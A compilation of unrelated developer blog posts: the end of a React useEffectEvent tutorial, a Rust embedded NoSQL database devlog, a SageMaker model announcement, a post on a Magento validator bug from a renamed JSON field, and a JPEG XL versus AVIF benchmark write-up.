Key concept: theme and isMuted can each change independently, as often as the user likes, and neither one is a dependency anywhere. The rule that decides what goes in useEffect's array hasn't changed — list every reactive value the Effect's behavior depends on — it's just that theme and isMuted were never one of those to begin with. They were Effect Event inputs all along; useEffectEvent just gives that distinction a real API instead of a lint-rule workaround.

Edge cases and gotchas

  • You can only call an Effect Event from inside an Effect, or from inside another Effect Event. Calling it during render, or handing it to a child component or another Hook as a prop, is not supported — eslint-plugin-react-hooks (6.1 and later; the current major is 7.x) flags both.
  • It must be declared at the top level of a component or custom Hook, like any other Hook — not inside a loop, condition, or nested function. If you need one per item in a list, pull that item into its own component.
  • It cannot go in a dependency array. You don't need to add it — the lint rule never asks you to — and if you add it anyway, a current eslint-plugin-react-hooks flags it directly (Functions returned from useEffectEvent must not be included in the dependency array) and tells you to remove it, because the whole point is that it isn't reactive.
  • It is not a blanket fix for exhaustive-deps warnings. If a value genuinely should restart the Effect — roomId in every example above — wrapping it in useEffectEvent to make the warning go away reintroduces the exact stale-closure bug Stage 1 showed, just with a newer API wrapped around it. The question to ask every time is "should this value actually restart what the Effect is doing?", not "how do I make the warning stop."
  • It doesn't replace useRef for everything. If you need to read a value from outside any Effect at all — say, inside a setTimeout callback registered by an event handler, not an Effect — useEffectEvent's restriction to Effects means a ref, or a plain callback prop, is still the right tool.
  • Server Components never run Effects, so this is purely a client-component concern; it doesn't change anything about the server/client boundary.

Best practices

  • Reach for useEffectEvent when an Effect's trigger condition should stay narrow (one connection per roomId) but an action it fires needs to use whatever is current at the moment it fires, not whatever was current when the Effect last started.
  • Don't reach for it reflexively every time exhaustive-deps complains. First ask whether the flagged value should actually resynchronize the Effect. If yes, keep it in the array — that's not friction, that's the rule doing its job.
  • Keep Effect Events small and named for what they do (onConnected, onMessage), not for what they avoid (stableTheme). The name should describe the moment it fires, because that's the mental model you're encoding.
  • Pair it with a real connection/subscription pattern, not a one-off side effect. The value of splitting reactive setup from non-reactive reaction shows up most in Effects that stay alive across renders — connections, subscriptions, timers — not in an Effect that runs once and is done.

FAQ

Is useEffectEvent a replacement for useCallback?

No. useCallback memoizes a function's identity across renders so a child doesn't re-render or a dependency array doesn't see a "new" function every time. useEffectEvent doesn't memoize for performance — it changes what the function is allowed to see (always-latest, never-reactive) and where it can be called from (only Effects and other Effect Events). They solve different problems and aren't interchangeable.

Can I call an Effect Event from a click handler?

No — an Effect Event can only be called from inside an Effect or another Effect Event, and the lint rule enforces this. If you need current-value behavior inside an onClick, you already have it: a normal event handler always closes over the latest render's values naturally, because it's recreated every render. The stale-closure problem this Hook solves is specific to long-lived Effects, not short-lived event handlers.

Did this exist before React 19.2?

Yes, behind an unstable name. It shipped for a long stretch as experimental_useEffectEvent, and the stabilized, unprefixed useEffectEvent landed in React 19.2 (October 2025). Code written against the experimental name needs the import updated, but the behavior and rules carried over.

Does useEffectEvent need a special ESLint setup?

You need a current eslint-plugin-react-hooks (6.1+; 7.x as of this writing) for the linter to correctly exclude Effect Event functions from dependency-array warnings instead of flagging them as missing. Without it, you'll fight the linter over something it already knows how to handle in a current version.

What happens if I put the Effect Event function in the dependency array anyway?

A current eslint-plugin-react-hooks flags it and tells you to remove it — it won't silently let it through. Functionally, adding it wouldn't do anything useful even if the linter allowed it: the function reference itself isn't what makes the behavior reactive or not. The reactivity question was never about the Effect Event's identity; it's about the values inside it, which are intentionally not tracked.

Cheat sheet

Situation What to do Why
A value decides what the Effect connects to / sets up Keep it in the dependency array It's reactive — the Effect's job changes when it changes
A value is only read after something the Effect set up fires Read it inside a useEffectEvent Always current, never forces a re-run
Tempted to silence exhaustive-deps by deleting a dependency Ask: should this value restart the Effect? If yes, keep it. If no, wrap the code that reads it in useEffectEvent Deleting it silently reintroduces a stale closure
Need current-value behavior inside an onClick/onChange Do nothing special Event handlers already close over the latest render
Need current-value behavior inside a setTimeout set up outside any Effect Use a ref useEffectEvent only works from inside Effects 
import { useEffect, useEffectEvent } from "react";

function ChatRoom({ roomId, theme, isMuted }) {
  // Non-reactive reads live here — never in the deps array, never the trigger.
  const onConnected = useEffectEvent(() => {
    showNotification("Connected!", theme);
  });

  useEffect(() => {
    // Only truly reactive values live here.
    const connection = createConnection(roomId);
    connection.on("connected", () => onConnected());
    connection.connect();
    return () => connection.disconnect();
  }, [roomId]);

  return <h1>Welcome to {roomId}</h1>;
}

Key takeaways

  • A useEffect dependency array lists reactive values the Effect's job depends on — not every value the Effect's body happens to read.
  • Deleting a value from the array to stop an unwanted re-run reintroduces a stale closure: the deleted value gets frozen at whatever it was when the Effect last ran.
  • useEffectEvent (stable since React 19.2, October 2025) gives non-reactive reads a real home: the function always sees the latest props/state, but it's never a dependency and never retriggers the Effect.
  • It can only be called from inside an Effect or another Effect Event — never during render, never passed to a child or another Hook.
  • It is not a workaround for exhaustive-deps — if a value should genuinely resynchronize the Effect, it still belongs in the array.

🧠 Test yourself

Think it clicked? Take the 8-question quiz →

Instant feedback, a hint on every question, and an explanation for each answer — right or wrong.

That chat room from the opening scene now reconnects exactly when it should — when the room changes — and never when someone just prefers a darker screen. The bug was never really about dark mode; it was two different questions hiding inside one dependency array, and useEffectEvent is what finally lets you answer them separately.

If React Derived State taught you that an Effect syncing one piece of state into another is usually a bug, this is the companion lesson for the Effects you do need: not every value they read is there for the same reason, and now there's a real API for telling them apart. And if Re-render vs Remount taught you that key decides which component instance you're looking at, the same instinct applies here — roomId decides which connection you're looking at, and theme never should have.

Have you shipped a stale-closure bug from an Effect's dependency array — did you find it from a bug report, or from reading the code? Tell me below.

  • React Derived State: Why That useState Is Probably a Bug
  • React 19.3 ViewTransition: Animate State Without Losing It
  • React Re-render vs Remount: What Actually Triggers Each

Building a NoSQL Database in Rust, from Scratch: The Why
description:
Series: nosqlite devlog, Part 1

I do this thing sometimes where I get an idea at the wrong time. Not when I have free hours and a clear head, but at 1 AM, mid-week, while I should be doing something else entirely. The idea lands and refuses to leave.

The idea this time was simple on the surface: what if I built a database?

Not a production database. Not the next MongoDB or a distributed cloud thing. Just a small, honest, embedded database. One file, one process, document storage. Something I could actually finish understanding from top to bottom, because I was starting to realize that I had been using databases for years without really knowing what they were doing inside.

That bothered me.

So I started nosqlite. An experiment. A learning project. And what you are reading now is me trying to document how I built it, what I learned, and what it taught me about databases, data structures, systems programming, and Rust itself.

What Are We Actually Building

The description in the README is honest: "trying to build a small embedded nosql database from scratch in rust."

The name is a mashup of two real things: NoSQL and SQLite. Not because it is trying to replace either, but because it takes inspiration from both.

SQLite is one of the most deployed software libraries in human history. Every Android phone has it. Every iOS app probably uses it. Browsers use it. It is a self-contained database that lives in a single file. You do not start a server. You just open a file and start reading and writing. That simplicity is profound when you think about it. The whole database is just a file you can cp, mv, or put on a USB drive.

NoSQL is a broader idea. It basically means "not relational." Instead of tables with fixed columns, you store documents. A document is just a blob of structured data, something like JSON. The shape can vary per record. You do not declare a schema upfront. This model made a lot of sense for applications where data is fluid and hard to predict.

nosqlite tries to marry these two ideas. SQLite-like single file simplicity. NoSQL-like document storage.

That is the goal. And it is entirely an experiment.

Why I Built This in Rust

I was already shifting toward Rust as my primary language. I wrote about that decision separately. But this project cemented it.

Rust is the right tool for something like this because a database engine is fundamentally a systems problem. You are dealing with raw bytes. You are managing a file at the byte level. You are thinking about memory layout, about what happens when a process crashes mid-write, about how data is read back and verified. These are not higher-level concerns.

In TypeScript or Python, you would reach for a library to handle most of this. In Rust, you can actually go down to the level of reading four bytes at a known offset and interpreting them as a little-endian u32. You can describe the exact memory layout of a page. You can write a function that writes bytes into a buffer at a cursor position and have the type system enforce that you do not mess it up.

And the borrow checker, which every newcomer to Rust finds frustrating, becomes genuinely valuable when you are building something like this. You cannot accidentally have two mutable references to the same page buffer. The compiler forces you to think about ownership at every step, which turns out to be exactly what you want when you are building a storage engine.

Understanding What a Database Actually Is

Most developers, including me before this project, have a mental model of a database that looks something like: "you write a query, rows come back." That is the interface. The internals stay hidden.

Here is the simpler version of what actually happens.

A database is ultimately a program that manages a file. The file is structured in a very specific way so that the database can find things quickly, can guarantee that data is not corrupted, and can handle the program crashing at any moment without losing committed data.

Every database, whether it is SQLite or PostgreSQL, has roughly the same set of problems to solve:

How do you organize bytes in the file? You cannot just write raw data one record after another and hope for the best. You need structure. Databases use the concept of a page. A page is a fixed-size chunk of the file, usually 4096 bytes, which matches the OS's memory page size. The database reads and writes entire pages at once.

How do you find records? If every lookup required scanning the entire file, a database with millions of records would be unusably slow. This is where data structures like B-trees come in. B-trees let you find records in logarithmic time. nosqlite does not have a full B-tree index yet, but it is on the roadmap, and I will cover it in a later article.

How do you handle crashes? If you are in the middle of writing when the power goes out, your data should not become corrupt garbage. Most databases solve this with write-ahead logging, abbreviated WAL. You write your intention to a log first, then perform the actual write. On startup, you replay the log. nosqlite plans to implement WAL, but this is also future territory.

How do you support multiple users accessing the same database? This is the concurrency problem. nosqlite currently takes the simple path: only one process can open the database at a time, enforced with a lock file.

The Structure of nosqlite

The project is a Rust workspace with three crates:

nosqlite-core is the storage engine. Everything that reads from and writes to the database file lives here. The pager, the page layout, the catalog (which tracks collections), the document storage logic, the binary codec.

nosqlite-ffi is a C ABI bindings layer. It exposes the core engine through a C-compatible API so that other languages can use it. Go and Python bindings already exist. Dart/Flutter bindings are planned.

nosqlite-shell is a command-line shell. You can open a database file, create collections, insert documents, query them, and delete them, all from the terminal.

That layered design matters. The core does not know or care about what calls it. The FFI layer wraps it in a way that any language with a C FFI can use. The shell is just one consumer among many.

NoSQL Concepts You Need to Know

Before the next articles get into code, it is worth establishing the vocabulary.

Database is the top-level container. In nosqlite, it maps to a single file.

Collection is roughly equivalent to a table in a relational database, but without a fixed schema. In MongoDB, you would call this a collection. In nosqlite, that is the term too.

Document is a single record within a collection. A document is a structured blob of data. nosqlite stores documents in BSON format, which stands for Binary JSON. BSON is what MongoDB uses under the hood. It is like JSON but binary-encoded, which makes it faster to parse and more efficient to store.

ObjectId is a unique identifier automatically assigned to every document. It is a 12-byte value that encodes a timestamp, a machine identifier, and a counter. This is also borrowed from MongoDB.

A typical interaction with nosqlite looks like this through its shell:

create users
insert users { "name": "Priyanshu", "age": 22 }
find users
[
{ "_id": "...", "name": "Priyanshu", "age": 22 }
]

Simple. Intentionally simple. The focus is on understanding what happens under the hood when you type those commands.

The Experiment Mindset

I want to be honest about something. This project is not finished. It probably will not be "finished" in a traditional sense. I am building it as I learn, which means some commits introduce bugs, some commits fix them, and some commits just rename things because I changed my mind about the design. All of that is in the public history.

I am okay with that. This is not a portfolio piece trying to impress someone. It is a record of me figuring things out in public. I find that approach more useful than studying theory alone. When something breaks and I have to debug it at the byte level, I actually understand it. Reading about it in a book does not give me the same thing.

Each article in this series follows the same pattern: a feature lands, I write about it. What the problem was, what I built, what it taught me, what I am still not sure about.

The repository is at https://github.com/PriyanshuPz/nosqlite . The commit history is open. You can see exactly what changed and when.

Now here is the thing that kept me up when I started this project. I had a blank file. A completely empty .nsql file on disk. And I had to decide: what does byte zero mean? What is the very first thing I write? What does the engine look for when it opens that file tomorrow and needs to trust that it is valid?

That question sounds simple. It is not. And the answer to it is the entire next article.

title: Nemotron 3.5 Super VL model now available on Amazon SageMaker JumpStart
description:
NVIDIA's Nemotron 3.5 Super VL is now available on Amazon SageMaker JumpStart, expanding the portfolio of foundation models available to AWS customers. This vision-language model from the Nemotron 3.5 family accepts images, video, and text as input and generates text, enabling customers to deploy multimodal AI solutions on AWS infrastructure.

Nemotron 3.5 Super VL is designed for document intelligence, GUI understanding, video question answering, and multimodal agentic applications. It pairs a 120B-parameter hybrid Mixture-of-Experts (MoE) language backbone with 12B active parameters and a vision encoder, supporting context lengths of up to 1 million tokens. The model includes a built-in Multi-Token Prediction (MTP) head for speculative decoding to accelerate text generation, with reasoning configurable per request. It supports ten languages including English, French, Spanish, German, Japanese, Hindi, Korean, and Chinese. Post-trained with multimodal supervised fine-tuning on image, video, document, chart, and GUI data followed by GRPO reinforcement learning, it delivers structured JSON output, tool calling, and configurable reasoning for enterprise agent workflows. SageMaker JumpStart offers two variants: NVFP4 for optimized inference on G7 instances with NVIDIA RTX PRO 4500 Blackwell Server Edition GPUs, and BF16 reference weights on ml.p5en.48xlarge for customization including SFT, RL, distillation, and domain adaptation.

With SageMaker JumpStart, customers can deploy Nemotron 3.5 Super VL with just a few clicks to address their specific AI use cases.

To get started with these models, navigate to the SageMaker JumpStart model catalog in the SageMaker console or use the SageMaker Python SDK to deploy the models to your AWS account. For more information about deploying and using foundation models in SageMaker JumpStart, see the Amazon SageMaker JumpStart documentation.

title: A renamed JSON field made my validator lie for six weeks
description:
I maintain two open-source Magento modules that must agree:

  • a generator (module-ucp) that publishes a store's UCP profile at /.well-known/ucp
  • a validator (module-aeo-audit) that checks that profile

For six weeks they disagreed, and the validator was the one that was wrong. It told store owners that a correct profile had no signing keys.

What changed

UCP (Universal Commerce Protocol) ships dated releases. The 2026-08-25 release has this breaking change: signing_keys[] is removed from the profile, and keys[] (a JWK Set) is the only canonical field.

 {
-  "ucp": { "version": "2026-04-08", ... },
-  "signing_keys": [ { "kty": "EC", "crv": "P-256", "kid": "k1" } ]
+  "ucp": { "version": "2026-08-25", ... },
+  "keys": [ { "kty": "EC", "crv": "P-256", "kid": "k1" } ]
 }

The generator moved on 1 September. The validator shipped two releases after that, on 11 September and 15 October, and still read only signing_keys.

The two messages 

UCP protocol version "2026-08-25" is not one this audit knows
(2026-04-08, 2026-01-11, 2026-01-23) — it may be newer than this release

No signing_keys declared — RFC 9421 HTTP Message Signatures will not validate

The first one is fine. "I don't know this version" is an honest answer from a validator that is behind.

The second one is the bug. A missing field does not look unknown. It looks absent. So the validator reported a false problem with full confidence.

Why CI was green 

// Every fixture in the test suite looked like this:
$profile = [
    'ucp' => ['version' => '2026-04-08', /* ... */],
    'signing_keys' => [[ 'kty' => 'EC', 'crv' => 'P-256', 'alg' => 'ES256', 'kid' => 'k1' ]],
];

The tests proved the code matched my reading of the spec. Nothing in them could notice that the spec had moved.

The fix

Read the new field first, fall back to the old one, and say so when a profile mixes them:

$keysField   = null;
$signingKeys = [];
foreach (['keys', 'signing_keys'] as $field) {
    $candidate = $profile[$field] ?? ($ucp[$field] ?? null);
    if (is_array($candidate) && isset($candidate['keys'])) {
        $candidate = $candidate['keys']; // a JWK Set object {"keys": [...]}
    }
    if (is_array($candidate) && $candidate !== []) {
        $keysField   = $field;
        $signingKeys = array_values($candidate);
        break;
    }
}

if ($keysField === 'signing_keys' && is_string($version)
    && strcmp($version, '2026-08-25') >= 0) {
    $warnings[] = 'Profile says 2026-08-25 but publishes signing_keys[]; the field is keys[] since 2026-08-25';
}

Dated versions like 2026-08-25 sort correctly as strings, so strcmp is enough here.

Plus two new tests: an old profile on 2026-04-08 with signing_keys (warns "superseded", still counts the key), and a 2026-08-25 profile that still uses signing_keys (warns "use keys[]").

What I'd do earlier next time

  1. Treat a missing field as "maybe renamed". Before you report "X is missing", check the names X had in other spec releases.
  2. Add a contract test between generator and validator. Generate a profile with one module, validate it with the other, in CI. Then a change on one side breaks the build on the other. I haven't built this yet; it's next.
  3. Keep "unknown version" a warning. That one choice kept a stale validator from failing every current store.

How do you keep a validator in step with a spec that ships dated releases? Pinned fixtures, a scheduled job against the latest tag, something else?

Originally published at angeo.dev. Both modules are MIT: module-ucp, module-aeo-audit.

title: JPEG XL vs AVIF in 2026: Chrome Ships JXL, but AVIF Still Makes Smaller Files
description:
JPEG XL now works in every major browser. Chrome 155 started decoding it on October 6, 2026, Firefox 158 turned it on by default a week later, and Safari has had it since 17.0. So the obvious question is whether you should add image/jxl to your <picture> tags and switch over.

For most of your site, no. Two days after Firefox shipped, Jake Archibald published the most thorough JPEG XL vs AVIF comparison for web use-cases I've read, and for the ordinary lossy photos, screenshots and illustrations that make up a website, AVIF still produces smaller files and decodes faster. At default effort, the best JPEG XL encoder typically made photos 15–25% larger than AVIF.

JPEG XL does win in a few places that matter (lossless, recompressing old JPEGs, some HDR). I'll go through his numbers, then the markup I'd actually ship, plus a couple of points from the lobste.rs thread.

How he tested JPEG XL vs AVIF

The setup is careful enough that you can't wave the results away as one person's opinion:

  • Encoders: avifenc 1.4.2, cjxl from libjxl 0.12.0, jixel 0.4.2 (a newer JPEG XL encoder), and cwebp 1.6.0 for lossless WebP
  • Most images encoded at 1598px wide, 2x the blog's max display width (plus an 18 MP version of the F1 shot)
  • Files compared at matched quality using SSIMULACRA2 (50 = medium, 70 = high, 80 = very high, 90 = visually lossless), with ColorVideoVDP as a second metric
  • Hardware: M4 Pro MacBook Pro

He compares encoders at equal quality, so he never sets both to "quality 80" and then compares bytes. That is the only fair way to do it.

File sizes: AVIF wins most of the table

Image (SSIMULACRA2 target) AVIF libjxl jixel
F1 photo (70) 41.4 kB 58.4 kB (+41%) 46.6 kB (+12%)
People (70) 63.8 kB 95.5 kB (+50%) 70.9 kB (+11%)
Red panda (70) 99.6 kB 121.5 kB (+22%) 101.7 kB (+2%)
Weasel (60) 223.0 kB (+30% vs jixel) 213.0 kB (+24% vs jixel) 172.0 kB
Screenshot (80) 20.7 kB 34.1 kB (+65%) 25.4 kB (+23%)
Illustration (80) 68.5 kB 139.8 kB (+104%) 110.4 kB (+61%)
Alpha (70) 50.4 kB 78.6 kB (+56%) 119.1 kB (+136%)
Small F1 (70) 8.3 kB 10.7 kB (+29%) 9.5 kB (+14%)
F1, 18 MP (70) 146.7 kB 257.8 kB (+76%) 184.7 kB (+26%)

Summary by category:

  • Photos: at default effort the best JPEG XL result is 15–25% larger than AVIF. At max effort it's 6–20% larger. The weasel is the one photo where jixel wins clearly.
  • Screenshots and illustrations: JPEG XL is 30–90% larger at default effort and 20–70% larger at max.
  • Transparency: libjxl is 31–44% larger at default effort and 61–70% larger at max. jixel always encodes alpha losslessly, so it ends up 1.9–3.1x the size of AVIF.

On photos jixel gets a lot closer to AVIF than libjxl does, so if you test JPEG XL with nothing but cjxl you're testing the weaker encoder. Even jixel is still behind AVIF, though.

Encode and decode speed: JPEG XL is slower too

A lot of people assume JPEG XL is the fast one. Jake's measurements on the F1 photo don't back that up:

  • jixel's default is 12–36% faster to encode than AVIF, but its files are 14–18% larger.
  • To match AVIF's default file size, jixel extraslow takes 18–27x as long and uses about 10x the memory.
  • libjxl's default takes 1.5–2x AVIF's encode time and still produces bigger files.
  • Decoding JPEG XL takes 2–3x as long as AVIF at medium quality, and about 1.5–1.8x at very high quality. Safari's JPEG XL decoder is the slowest of the three.

For a build pipeline that re-encodes thousands of images, those multipliers show up directly in CI time.

Progressive loading: JPEG XL's big feature is a ~2 kB blur

Progressive decoding has always been JPEG XL's best argument. Chrome and Firefox render progressive JPEG XL. Safari shows the final image and no intermediate passes.

Jake doesn't think much of it in practice. The first pass is "a BlurHash-like preview" at about 2 kB, and it doesn't match what AVIF's preview shows until roughly 63 kB has arrived. The progressive AVIF F1 preview is about 11.5 kB. Progressive AVIF has its own costs: it renders progressively only in Chrome (a Firefox patch is in progress), and it decodes 29–44% slower there. Even so, progressive AVIF decoded 1.6–6x faster than the progressive JPEG XL equivalents.

If all you get early is a blur, you can inline a 2 kB placeholder yourself today, in any format.

Where JPEG XL beats AVIF

There are three cases where JPEG XL comes out clearly ahead:

  1. Lossless. libjxl gives the smallest lossless files on most images. Lossless WebP is 9–17% larger on photos, and lossless AVIF is 33–122% larger. libjxl's default encode takes 0.1–0.5 s.
  2. JPEG transcoding. You can repack an existing JPEG into JPEG XL losslessly and get a 9–20% smaller file, with bigger savings at higher resolutions. If you have a CDN full of old JPEGs, that's a free saving you can reverse later: 
   cjxl photo.jpg photo.jxl           # lossless JPEG recompression is the default for JPEG input
   djxl photo.jxl photo-restored.jpg  # gives you back the original JPEG bytes
  1. HDR with PQ. By HDR SSIMULACRA2, jixel's default ranges from 8% smaller to 3% larger than PQ AVIF, and ColorVideoVDP rates libjxl 28–53% smaller. No browser supports JPEG XL gain maps yet, and Firefox decodes HDR JPEG XL about 4x slower than AVIF.

Google's own launch post lands in the same place. It recommends "trying both AVIF and JPEG XL" and expects JPEG XL to be "most helpful for high-fidelity or lossless compression," so even Google isn't pitching it for your hero images at q70.

Animated AVIF or JPEG XL? Use a video

Animated AVIF came out at 725 kB and animated JPEG XL at 2.17 MB at the same ColorVideoVDP score. Animated AVIF is basically AV1 video, while JPEG XL encodes every frame on its own. Animated AVIF also plays badly in Chrome and Safari. Use <video muted autoplay>.

Browser support for JPEG XL vs AVIF, October 2026

AVIF JPEG XL
Chrome since 85 155 (jxl-rs decoder, Oct 6 2026)
Firefox since 93 158, on by default (Oct 13 2026)
Safari since 16.0 on iOS, 16.1 on macOS (full support from 16.4) since 17.0, no progressive rendering
Progressive rendering Chrome only Chrome, Firefox
HDR gain maps supported, Jake's pick for HDR in the format, but no browser decodes them

Chrome and Firefox now use the same Rust decoder, jxl-rs, which helps with interop. Google's post says the Rust decoder was picked for memory safety. Anyone still on Chrome below 155 or on Firefox ESR won't get JPEG XL, so you need a fallback either way.

What to put in your <picture> tag today

On lobste.rs, someone suggested listing every format and letting the browser choose. Jake replied that "the browser picks the first valid <source>." The order of your sources is still you choosing a format. Adding JPEG XL above AVIF means Chrome 155+ and Firefox 158+ download the larger, slower-to-decode file.

For lossy photos, screenshots and illustrations:

<picture>
  <source type="image/avif" srcset="hero.avif">
  <img src="hero.jpg" alt="..." width="1598" height="900">
</picture>

Encode at 4:4:4, which is what avifenc picks by default for PNG input. Jake found 4:2:0 rarely saved bytes and made his transparent test image 4–27% larger. Use the highest effort your build can afford. A starting point based on the quality setting from his stability test, with a slower speed:

avifenc -q 50 -s 5 input.png output.avif

He reports -s 5 gives about 10% smaller files than the default for about 3x the encode time on his F1 test image. Raise or lower it depending on how many images you encode.

Use JPEG XL when:

  • you're serving lossless images (put image/jxl first and a PNG or WebP fallback after it)
  • you're recompressing a legacy JPEG archive
  • an AVIF file comes out unusually large, which is the exact fallback Jake suggests. Try jixel on that image.

kangalio's one-line summary in the thread is the version I'd keep: "AVIF for deployed images, JPEG XL for source images."

The caveat: it all depends on the metric

Another commenter re-ran the tests with Butteraugli and found it favors JPEG XL at higher qualities. Jake said he used ColorVideoVDP specifically to avoid metrics the encoders tune for, and that jixel is "hyper-tuned to metrics." That argument isn't settled, and about ten test images is a small sample. Jake says to test your own images, and he's right.

Still, the timing is funny. Google deleted JPEG XL from Chromium in late 2022, shipped it again in 2026, and the best independent benchmark of the year says to keep serving AVIF for most things. I don't think bringing JPEG XL back was a mistake. I'd use it for archives and lossless work, and keep AVIF for the lossy images a website actually serves.

What are you serving in production right now: AVIF, JPEG XL, WebP, or plain JPEG? And what numbers would get you to switch? If you've run your own images through jixel and seen something different, post the sizes in the comments.

Sources

  • Jake Archibald, JPEG XL vs AVIF for web use-cases (Oct 2026)
  • lobste.rs discussion
  • Chrome for Developers, Shipping JPEG XL in Chrome (Oct 6, 2026)
  • Phoronix, Firefox 158 released with JPEG-XL support by default (Oct 12, 2026)
  • jxl-rs and libjxl repos
  • Can I use: AVIF and Can I use: JPEG XL
